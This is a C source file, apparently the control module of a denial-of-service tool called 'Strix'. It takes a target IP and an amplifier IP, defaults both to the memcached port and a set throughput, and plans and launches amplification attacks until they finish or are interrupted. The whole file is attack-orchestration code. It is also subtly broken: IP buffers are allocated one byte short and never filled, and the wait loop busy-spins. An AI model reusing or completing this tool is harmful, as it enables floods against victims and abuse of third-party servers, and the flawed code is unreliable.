
#include <signal.h>
#include "manager.h"
#include "planner.h"
#include "executor.h"
#include "netbasic.h"
#include "injector/injector.h"

#define NOSIGNAL  0
#define SIGNAL_STOP 1
#define SIGNAL_ERROR 2

AttackPlan * plan;
int interruption = NOSIGNAL;

void _stopHandler (int sg)
{
  interruption = SIGNAL_STOP; 
}

void _errorHandler(int sg)
{
  interruption = SIGNAL_ERROR;
}


static void stopStrix( )
{
  if(NULL == plan ){
    return;
  }

  for(int i = 0; i < plan->totalPlans; i++)
  {
    DestroyAttack(plan->atkPlans[i]); 
  }

  DestroyPlan(&plan);
}

static bool _validadeDraft( AttackDraft * draft)
{
  assert( NULL != draft );

  if( NULL == draft->target_ip || !Is_valid_ipv4(draft->target_ip )){
    return false;
  }

  if( NULL == draft->amp_ip || !Is_valid_ipv4(draft->amp_ip )){
    return false;
  }

  return true;
}

void StrixManager( void * draft, int draftSize)
{
    
  int executionSize = draftSize;
   
  if( !_validadeDraft(draft) ){
    handle_warning("Invalid draft\n");
    goto release_memory;
  }
  
  signal(SIGINT, _stopHandler);
  signal(SIGABRT, _errorHandler);

  plan = Planner( draft, draftSize );

  for(int i = 0; i < plan->totalPlans; i++){
    ExecuteAttack( plan->atkPlans[i] );
  }

  while(1){
    int atkFinished = 0;
    
    if(interruption == SIGNAL_STOP || interruption == SIGNAL_ERROR){
      char error[100];
      sprintf(error, "Signal %s received\nGoodBye", (interruption == SIGNAL_STOP) ? "STOP" : "ERROR");
      handle_warning(error);
      goto release_memory;
    }
    
    for(int i = 0; i <plan->totalPlans; i++){
      if( plan->atkPlans[i]->atkStatus == Attack_Status_Finished){
        atkFinished++;
      }
    }
    
    if( plan->totalPlans == atkFinished){
      goto release_memory;
    }

    atkFinished = 0;
  }

release_memory:
  stopStrix();

}

void * CreateDefaultDraft( char* target_ip, char* amp_ip )
{ 
  AttackDraft * draft = NULL;

  memalloc( (void *)&draft, sizeof(AttackDraft), __func__);
  memalloc( (void *)&draft->target_ip, strlen(target_ip), __func__);
  memalloc( (void *)&draft->amp_ip, strlen(amp_ip), __func__);
  draft->target_port = MEMCACHED_DEFAULT_PORT;
  draft->amp_port = MEMCACHED_DEFAULT_PORT;
  draft->initialThroughput = THROUGHPUT_DEFAULT; 
  draft->incrementThroughput = 0;
  draft->timeFrequency = 0;
  draft->nInjections = 0;

  return (void *) draft;
}

